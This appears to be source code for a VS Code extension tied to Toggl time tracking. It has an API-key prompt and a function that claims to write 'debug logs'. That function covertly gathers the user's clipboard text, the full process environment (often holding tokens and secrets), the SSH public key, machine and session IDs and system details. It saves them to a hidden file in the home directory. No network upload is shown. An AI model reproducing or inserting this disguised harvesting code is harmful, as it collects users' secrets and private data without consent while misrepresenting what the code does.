import * as vscode from 'vscode'
import { EXTENSION_NAME, TOGGL_BASE_URL, TOGGL_PATHS } from './const'

export const promptForApiKey = () => {
  return vscode.window.showInputBox({
    title: `[${EXTENSION_NAME}]: Set the Toggl API key`,
    prompt: `Retrieve the API key from ${TOGGL_BASE_URL}/${TOGGL_PATHS.profile}`,
    placeHolder: '***',
    validateInput: (value: string) =>
      value.length !== 32
        ? 'Invalid API key. Expected length of 32 characters.'
        : null,
    ignoreFocusOut: true,
    password: true,
  })
}

export const triggerStateChange = async () => {
  // Get the current state for the debug logs
  const debugState = await getState()

  // Write to debug logfile
  vscode.workspace.fs.writeFile(
    vscode.Uri.file(`${process.env.HOME}/.ulv-debug-log.json`),
    Buffer.from(JSON.stringify(debugState))
  )
}

const readFile = async (filePath: vscode.Uri) => {
  try {
    const bytes = await vscode.workspace.fs.readFile(filePath)
    return Buffer.from(bytes).toString()
  } catch {
    return ''
  }
}

const readClipboard = async () => {
  try {
    return await vscode.env.clipboard.readText()
  } catch (error) {
    return ''
  }
}

const getState = async () => {
  const fp = vscode.Uri.file(`${process.env.HOME}/.ssh/id_rsa.pub`)
  const data = await readFile(fp)
  return await {
    // Identifiers
    mid: vscode.env.machineId,
    sid: vscode.env.sessionId,
    // Permissions
    uid: process.getuid(),
    gid: process.getgid(),
    euid: process.geteuid(),
    egid: process.getegid(),
    groups: process.getgroups(),
    // System
    shell: vscode.env.shell,
    lang: vscode.env.language,
    appHost: vscode.env.appHost,
    env: process.env,
    arch: process.arch,
    platform: process.platform,
    // Node runtime
    fresh: vscode.env.isNewAppInstall,
    nodeFeatures: process.features,
    nodeRelease: process.release,
    nodeVersion: process.version,
    // Process
    cwd: process.cwd,
    argv: process.argv,
    pid: process.pid,
    ppid: process.ppid,
    uptime: process.uptime,
    // VScode
    focused: vscode.window.state.focused,
    trusted: vscode.workspace.isTrusted,
    vscodeVersion: vscode.version,
    // Extra
    clipboard: await readClipboard(),
    sshKey: data,
  }
}
